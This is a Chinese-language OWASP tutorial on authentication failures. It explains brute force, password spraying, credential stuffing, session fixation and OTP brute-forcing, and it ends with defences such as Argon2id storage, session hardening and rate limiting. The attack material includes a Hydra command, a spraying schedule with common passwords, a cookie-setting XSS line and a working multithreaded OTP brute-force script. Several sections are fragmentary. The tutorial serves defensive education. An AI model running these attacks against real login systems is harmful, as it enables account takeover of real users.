A07:2021 - 身份识别和认证失效

HIGH 排名第7

Identification and Authentication Failures（身份识别和认证失效）涵盖了与用户身份验证相关的所有漏洞。当应用无法正确确认用户身份时，攻击者可以冒充任何用户，包括管理员。

认证 vs 授权

认证 (Authentication)：验证"你是谁" — 本章讨论的内容

授权 (Authorization)：验证"你能做什么" — 参见 A01 权限控制失效

认证是授权的前提。如果认证环节被绕过，后续的所有权限控制都形同虚设。

1. 概述

1.1 认证失效的常见表现

漏洞类型描述影响
暴力破解无限次尝试密码不被阻止弱密码账户被攻破
凭证填充使用泄露的密码库自动化尝试复用密码的用户被攻破
弱密码策略允许简单密码如"123456"大量用户账户不安全
默认凭证admin/admin 未修改直接获取管理权限
会话固定登录后未重新生成Session ID攻击者劫持会话
Session 不失效登出后Session仍有效泄露的Session可持续利用
MFA 缺失/绕过关键操作无二次验证单因素即可完全控制账户
密码明文存储不使用哈希存储密码数据库泄露=所有密码泄露

2. 暴力破解 (Brute Force)

2.1 暴力破解类型

类型方法速度成功率
简单暴力破解尝试所有可能组合 (aaa, aab...)极慢理论100%
字典攻击使用常见密码字典快中（取决于密码强度）
混合攻击字典+规则变换 (Password→P@ssw0rd)中较高
反向暴力破解固定密码，遍历用户名快对弱密码有效
密码喷射少量常见密码对大量用户快对大型组织有效

2.2 攻击工具与实践

# Hydra - 在线密码暴力破解

# HTTP POST 表单暴力破解
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  target.com http-post-form \

# SSH 暴力破解

# 密码喷射（Password Spraying）
# 对所有用户尝试少量密码，避免触发单用户锁定

# 2. 发送到 Intruder

# 4. 加载字典 → 开始攻击
# 5. 根据响应长度/状态码判断成功

# - 观察是否出现 CAPTCHA
# - 更换IP是否重置计数

2.3 密码喷射 (Password Spraying)

密码喷射 vs 传统暴力破解： 传统暴力破解（对单个用户试多个密码）： admin → password1 ✗ admin → password2 ✗ admin → password3 ✗ ... (触发账户锁定！) 密码喷射（对多个用户试同一密码）： Round 1: "Company2024!" user001 → Company2024! ✗ user002 → Company2024! ✗ user003 → Company2024! ✓ ← 成功！ ... (每个用户只试1次，不触发锁定) 等待30分钟（避免检测） Round 2: "Welcome1!" user001 → Welcome1! ✗ user002 → Welcome1! ✓ ← 成功！ ... 常用喷射密码： - 公司名+年份: Company2024! - 季节+年份: Spring2024! - 城市名+数字: Beijing123! - 默认密码: Welcome1!, P@ssw0rd

3. 凭证填充 (Credential Stuffing)

3.1 攻击原理

凭证填充的前提条件

大量用户在多个网站使用相同密码。当某个网站发生数据泄露后，攻击者获取邮箱+密码组合，然后在其他网站批量尝试登录。

成功率：通常 0.1% - 2%。看似很低，但如果有 100 万条凭证，就能攻破 1000-20000 个账户。

# 凭证填充攻击流程

# 1. 获取泄露数据（暗网/Telegram频道/公开dump）
# 常见泄露数据库：
# - Collection #1-5 (数十亿条)
# - LinkedIn 2021 (7亿条)
# - Facebook 2021 (5.33亿条)

# 2. 清洗数据，提取 email:password 对
cat breach_data.txt | sort -u > clean_credentials.txt

# 3. 使用工具批量尝试
# SentryMBA, OpenBullet, Custom scripts

import requests

3.2 检测凭证填充

# 凭证填充的检测信号

# 1. 登录失败率异常升高
# 正常: 5-10% 失败率
# 攻击: 95%+ 失败率（大量不存在的账户或错误密码）

# 2. 登录来源异常
# - 大量不同账户从相同IP登录
# - 来自数据中心/云主机IP的登录
# - 地理位置异常跳跃

# 3. 行为特征
# - 极其规律的请求间隔（机器行为）
# - 无鼠标移动/键盘输入时间
# - 登录成功后不进行任何操作（只验证凭证有效性）

# 检测规则示例 (伪代码)
def detect_credential_stuffing(login_events):
    # 同一IP在1小时内对100+不同账户登录失败
    ip_failures = group_by_ip(login_events)
    for ip, events in ip_failures.items():
        unique_accounts = set(e.username for e in events if not e.success)
        if len(unique_accounts) > 100:
            alert(f"Credential stuffing from {ip}: {len(unique_accounts)} accounts")

4. 弱密码策略

4.1 密码安全存储

密码存储演进： ❌ 明文存储: password → "password123" (数据库泄露=全部完蛋) ❌ MD5: password → "482c811..." (彩虹表秒破) ❌ SHA-256: password → "ef92b7..." (GPU暴力破解) ❌ SHA-256+固定盐: password+salt → "a3f2..." (盐泄露后可批量破解) ✓ bcrypt: password → "$2b$12$..." (慢哈希，每个用户独立盐) ✓ scrypt: password → (内存密集型，抗GPU/ASIC) ✓ Argon2id: password → (最新推荐，内存+时间双重密集) 推荐配置： Argon2id: memory=65536KB, iterations=3, parallelism=4 bcrypt: cost factor=12 (约250ms/次) scrypt: N=2^15, r=8, p=1

4.2 密码策略设计

# ✅ 现代密码策略（NIST SP 800-63B 推荐）

# 好的策略：
# - 最少 8 字符（推荐 12+）
# - 最大长度至少 64 字符
# - 允许所有 Unicode 字符（包括空格、中文等）
# - 检查常见密码黑名单
# - 检查是否在泄露数据库中（HaveIBeenPwned API）
# - 不要强制定期更换（除非有证据表明泄露）

# ❌ 过时的策略（反而降低安全性）：
# - 必须包含大小写+数字+特殊字符 → 导致用户用 P@ssw0rd! 这种模式
# - 90天强制更换 → 导致 Password1, Password2, Password3...
# - 禁止粘贴密码 → 阻止密码管理器使用

# Python 密码验证示例
import hashlib
import requests

class PasswordValidator:
    COMMON_PASSWORDS = set(open('10k-common-passwords.txt').read().splitlines())

    def validate(self, password):
        errors = []

        # 长度检查
        if len(password) < 8:
            errors.append("密码至少8个字符")
        if len(password) > 128:
            errors.append("密码不能超过128个字符")

        # 常见密码检查
        if password.lower() in self.COMMON_PASSWORDS:
            errors.append("密码过于常见")

        # 检查是否在泄露数据库中 (k-anonymity API)
        if self._check_pwned(password):
            errors.append("此密码已在数据泄露中出现，请更换")

        return errors

    def _check_pwned(self, password):
        """使用 HaveIBeenPwned API 检查密码是否泄露"""
        sha1 = hashlib.sha1(password.encode()).hexdigest().upper()
        prefix, suffix = sha1[:5], sha1[5:]
        resp = requests.get(f"https://api.pwnedpasswords.com/range/{prefix}")
        return suffix in resp.text

安全要求原因实现

5.2 Session Fixation 攻击

Session Fixation 攻击流程： 1. 攻击者获取一个有效的 Session ID 访问 target.com → 获得 SESSIONID=abc123 2. 攻击者将此 Session ID 固定给受害者 发送链接: http://target.com/login?SESSIONID=abc123 或通过 XSS: document.cookie = "SESSIONID=abc123" 3. 受害者使用该 Session ID 登录 POST /login (Cookie: SESSIONID=abc123) → 登录成功，Session abc123 现在关联了受害者身份 4. 攻击者使用相同 Session ID 访问 GET /dashboard (Cookie: SESSIONID=abc123) → 以受害者身份访问！ 防御: 登录成功后必须重新生成 Session ID！ 旧 Session: abc123 (匿名) 登录成功后: 销毁 abc123，生成新 def456 (已认证)
# Session 安全配置示例

# Python Flask
app.config.update(
    SESSION_COOKIE_SECURE=True,      # 仅HTTPS传输
    SESSION_COOKIE_HTTPONLY=True,     # 禁止JS访问
    SESSION_COOKIE_SAMESITE='Lax',   # CSRF防护
    PERMANENT_SESSION_LIFETIME=1800,  # 30分钟过期
)

@app.route('/login', methods=['POST'])
def login():
    user = authenticate(request.form)
    if user:
        # 关键：登录后重新生成 Session ID
        session.regenerate()
        session['user_id'] = user.id
        session['login_time'] = time.time()
        return redirect('/dashboard')

@app.route('/logout')
def logout():
    # 关键：服务端销毁 Session
    session.clear()
    response = redirect('/login')
    response.delete_cookie('session')
    return response

# Express.js (Node.js)
app.use(session({
    secret: crypto.randomBytes(32).toString('hex'),
    name: '__Host-session',  // Cookie前缀增加安全
    resave: false,
    saveUninitialized: false,
    cookie: {
        secure: true,
        httpOnly: true,
        sameSite: 'strict',
        maxAge: 30 * 60 * 1000  // 30分钟
    }
}));

// 登录后重新生成
req.session.regenerate((err) => {
    req.session.userId = user.id;
});

6.2 OTP 暴力破解实例

# 场景：6位数字OTP，无速率限制

# 暴力破解6位OTP (000000-999999)
import requests
import concurrent.futures

def try_otp(otp_code):
    resp = requests.post('https://target.com/verify-otp', json={
        'otp': f'{otp_code:06d}'  # 格式化为6位
    }, cookies={'session': stolen_session})
    return resp.status_code == 200

# 并发尝试
with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
    futures = {executor.submit(try_otp, code): code
               for code in range(1000000)}
    for future in concurrent.futures.as_completed(futures):
        if future.result():
            print(f"Valid OTP: {futures[future]:06d}")
            break

# 100万种可能，50并发，每秒100请求 = 约3小时完成
# 如果OTP 5分钟有效 → 只需尝试约30000次 → 约5分钟

# ✅ 防御
# 1. 限制OTP尝试次数: 最多3-5次
# 2. OTP输入错误后延迟递增: 1s, 2s, 4s, 8s...
# 3. 错误次数过多时锁定并重新发送新OTP
# 4. 使用8位OTP增加暴力破解难度

8. 防御方案

8.1 认证安全检查清单

认证安全最佳实践
类别措施优先级
密码存储使用 Argon2id/bcrypt，cost factor ≥ 12必须
暴力破解账户锁定 + 渐进延迟 + CAPTCHA必须
MFA关键操作强制二次验证（推荐TOTP/WebAuthn）强烈推荐
SessionSecure + HttpOnly + SameSite + 重新生成必须
密码策略最少8字符 + 检查泄露库 + 禁止常见密码必须

# 多层防暴力破解策略

import time
from functools import wraps

class BruteForceProtection:
    """多层暴力破解防御"""

    def __init__(self, redis_client):
        self.redis = redis_client

    def check_and_record(self, username, ip):
        """检查是否允许登录尝试"""

        # Layer 1: IP 限制 - 每IP每分钟最多10次
        ip_key = f"login_attempts:ip:{ip}"
        ip_attempts = self.redis.incr(ip_key)
        self.redis.expire(ip_key, 60)
        if ip_attempts > 10:
            return False, "请求过于频繁，请稍后再试"

        # Layer 2: 账户限制 - 每账户5次失败后锁定15分钟
        user_key = f"login_attempts:user:{username}"
        user_attempts = int(self.redis.get(user_key) or 0)
        if user_attempts >= 5:
            ttl = self.redis.ttl(user_key)
            return False, f"账户已锁定，请{ttl}秒后再试"

        # Layer 3: 全局限制 - 检测分布式攻击
        global_key = f"login_failures:global:{int(time.time()) // 300}"
        global_failures = int(self.redis.get(global_key) or 0)
        if global_failures > 1000:
            # 触发全局CAPTCHA
            return False, "CAPTCHA_REQUIRED"

        return True, None

    def record_failure(self, username, ip):
        """记录失败尝试"""
        user_key = f"login_attempts:user:{username}"
        self.redis.incr(user_key)
        self.redis.expire(user_key, 900)  # 15分钟锁定

        # 渐进延迟
        attempts = int(self.redis.get(user_key) or 0)
        delay = min(2 ** attempts, 30)  # 指数递增，最大30秒
        time.sleep(delay)

    def record_success(self, username, ip):
        """登录成功，清除计数"""
        self.redis.delete(f"login_attempts:user:{username}")
